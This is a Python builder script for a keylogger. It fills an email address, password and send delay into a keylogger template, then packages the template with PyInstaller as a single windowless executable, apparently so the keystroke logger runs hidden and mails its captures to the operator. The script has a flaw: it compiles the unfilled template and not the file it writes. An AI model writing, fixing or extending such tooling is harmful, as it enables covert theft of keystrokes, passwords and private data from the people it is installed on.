import argparse
import PyInstaller.__main__
parser = argparse.ArgumentParser(description='PUT EMAIL AND PASSWORD HERE')
parser.add_argument('-e', action='store', dest='email', help='email address',
                    required=True)
parser.add_argument('-p', action='store', dest='password',
                    help='email password', required=True, )
parser.add_argument('-d', action='store', dest='delay',
                    help= 'delay with which letters should be '
                          'send', required=True, )
parser.add_argument('-f', action='store', dest='filename',
                    help='name of .py file with data from others arguments',
                    required=True, )
args = parser.parse_args()
destination_filename = 'keyloger_template.py'
with open(destination_filename, 'r') as file:
    replace_zero = file.read().replace("{0}", args.email)
    replace_one = replace_zero.replace("{1}", args.password)
    replace_two = replace_one.replace("{2}", args.delay)
save_filename = args.filename
with open(save_filename, 'w') as file:
    file.write(replace_two)
#pyinstaller works here

PyInstaller.__main__.run([
    '--name={0}'.format(args.filename).replace('.py', '.exe'),
    '--onefile',
    '--noconsole',
    'keyloger_template.py'

])